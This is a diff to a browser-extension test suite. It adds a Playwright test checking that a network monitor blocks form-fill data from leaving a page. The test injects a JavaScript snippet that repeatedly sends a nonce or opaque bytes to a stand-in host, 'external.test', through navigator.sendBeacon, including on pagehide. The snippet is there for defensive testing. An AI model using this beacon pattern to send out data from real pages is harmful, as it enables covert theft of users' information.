@@ -183,6 +183,37 @@ def test_result_is_unverified_until_every_phase_completes() -> None:
     assert result["status"] == UNVERIFIED
 
 
+@pytest.mark.parametrize("kind", ["opaque", "sentinel"])
+def test_prefill_blocker_prevents_delivery_through_clear_and_unload(tmp_path, kind):
+    nonce = _nonce()
+    with _browser(tmp_path) as h:
+        page = h.context.pages[0]
+        monitor = SentinelNetworkMonitor(nonce, [], h.extension_id)
+        monitor.start(h.context)
+        page.goto(h.url("pilot_monitor_fixtures/blank.html"))
+        assert monitor.prefill_blocking_reasons(page) == []
+        monitor.enable_pre_send_blocking()
+        monitor.mark_fill_started(["email"])
+        page.evaluate("""({port, nonce, kind}) => {
+          const url = `http://external.test:${port}/sink`;
+          const send = () => navigator.sendBeacon(url, new Blob(
+            [kind === 'opaque' ? new Uint8Array([0, 255, 3]) : nonce],
+            {type: 'application/octet-stream'}));
+          send(); setTimeout(send, 300);
+          addEventListener('pagehide', send);
+        }""", {"port": h.port, "nonce": nonce, "kind": kind})
+        monitor.mark_cleared()
+        monitor.wait_quiet(min_seconds=0.6, quiet_seconds=0.3)
+        result = monitor.result()
+        assert h.server.received_posts == 0, result
+    assert result["pre_send_blocking_enabled"] is True
+    assert result["unload_network_blocking_enabled"] is True
+    assert result["blocked_opaque_requests" if kind == "opaque" else "blocked_sentinel_attempts"] >= 2
+    assert result["sentinel_network_leak"] in (0, UNVERIFIED)
+    assert result["opaque_requests"] == 0
+    assert result["status"] == (UNVERIFIED if kind == "opaque" else "FAIL")
+
+
 # --------------------------------------------------------------------------
 # Local browser harness
 # --------------------------------------------------------------------------
@@ -192,6 +223,7 @@ class _Handler(SimpleHTTPRequestHandler):
         return
 
     def do_POST(self) -> None:
+        self.server.received_posts += 1
         length = int(self.headers.get("content-length") or 0)
         if length:
             self.rfile.read(length)
@@ -200,13 +232,14 @@ class _Handler(SimpleHTTPRequestHandler):
 
 
 @contextmanager
-def _http_server() -> Iterator[int]:
+def _http_server() -> Iterator[ThreadingHTTPServer]:
     handler = lambda *a, **k: _Handler(*a, directory=str(TESTS_ROOT), **k)  # noqa: E731
     server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
+    server.received_posts = 0
     thread = threading.Thread(target=server.serve_forever, daemon=True)
     thread.start()
     try:
-        yield server.server_port
+        yield server
     finally:
         server.shutdown()
         server.server_close()
@@ -255,6 +288,7 @@ class Harness:
     context: object
     port: int
     extension_id: str
+    server: object
 
     def url(self, path: str) -> str:
         return f"http://127.0.0.1:{self.port}/{path}"
@@ -323,7 +357,8 @@ def _browser(tmp_path: Path, *, sw_events: bool = True) -> Iterator[Harness]:
     (extension_dir / "sw.js").write_text(_FIXTURE_SW_JS, encoding="utf-8")
     (extension_dir / "content.js").write_text(_FIXTURE_CONTENT_JS, encoding="utf-8")
     guard = service_worker_network_events() if sw_events else nullcontext()
-    with _http_server() as port, guard, sync_playwright() as playwright:
+    with _http_server() as server, guard, sync_playwright() as playwright:
+        port = server.server_port
         context = playwright.chromium.launch_persistent_context(
             str(tmp_path / "profile"),
             channel="chromium",
@@ -336,7 +371,7 @@ def _browser(tmp_path: Path, *, sw_events: bool = True) -> Iterator[Harness]:
             ],
         )
         try:
-            yield Harness(context, port, _discover_extension_id(context, port))
+            yield Harness(context, port, _discover_extension_id(context, port), server)
         finally:
             context.close()
 
